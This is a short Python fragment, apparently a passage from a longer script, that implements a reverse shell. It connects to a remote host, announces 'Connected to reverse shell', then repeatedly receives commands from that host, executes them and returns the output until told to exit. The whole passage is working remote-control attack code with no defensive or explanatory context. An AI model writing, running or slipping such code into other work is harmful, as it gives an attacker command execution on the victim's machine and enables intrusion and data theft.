    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(b"Connected to reverse shell\n")

    while True:
        command = s.recv(1024).decode('utf-8').strip()
        if command == "exit":
            break
        if command:
            response = execute_command(command)
            s.sendall(response.encode('utf-8') + b"\n")

    s.close()

